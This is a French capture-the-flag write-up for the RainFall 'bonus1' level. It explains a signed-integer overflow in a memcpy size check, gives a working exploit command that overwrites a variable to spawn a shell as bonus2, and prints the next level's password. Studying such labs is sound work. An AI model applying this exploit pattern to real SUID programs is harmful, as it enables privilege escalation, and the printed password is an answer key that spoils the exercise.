# BONUS1

```bash
bonus1@RainFall:~$ ls -la
```

```text
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Mar  6  2016 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Apr  3  2012 .bashrc
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
```

`bonus1` est un binaire **SUID appartenant à `bonus2`**.

## Analyse

Le programme récupère `argv[1]` avec `atoi()` puis vérifie :

```asm
cmp DWORD PTR [esp+0x3c],0x9
jle ...
```

Les valeurs supérieures à `9` sont refusées, mais les valeurs négatives sont acceptées.

La valeur est ensuite multipliée par `4` et utilisée comme taille pour `memcpy()` :

```asm
lea ecx,[eax*4]
...
call memcpy@plt
```

Le buffer fait seulement `40` octets.

## Exploitation

On utilise la valeur :

```text
-2147483637
```

La multiplication par `4` donne :

```text
-2147483637 × 4 = -8589934548
```

Mais un entier signé 32 bits ne peut contenir que des valeurs entre :

```text
-2147483648 et 2147483647
```

Le résultat déborde donc.

Sur 32 bits, on travaille modulo `2^32` :

```text
-8589934548 mod 4294967296
= 4294967296 - 8589934548 mod 4294967296
= 4294967296 - 4294967252
= 44
```

Dans le contexte de `memcpy()`, la taille résultante est donc interprétée comme une valeur non signée, ici `44` octets.

Cela permet de copier plus que les `40` octets du buffer et donc d'écraser les données situées juste après.

Le programme vérifie ensuite si `nb` vaut :

```text
0x574f4c46
```

On place donc `40` `A` suivis de :

```text
\x46\x4c\x4f\x57
```

qui correspond à `0x574f4c46` en little-endian.

## Exploit

```bash
./bonus1 -2147483637 $(python2 -c 'import sys; sys.stdout.write("A" * 40 + "\x46\x4c\x4f\x57")')
```

La valeur de `nb` est alors écrasée par :

```text
0x574f4c46
```

La condition est satisfaite et le programme exécute :

```asm
execl("/bin/sh", "sh", NULL)
```

On obtient un shell avec les droits de `bonus2` :

```text
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users)
```

On récupère ensuite le mot de passe :

```bash
cat /home/user/bonus2/.pass
```

```text
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
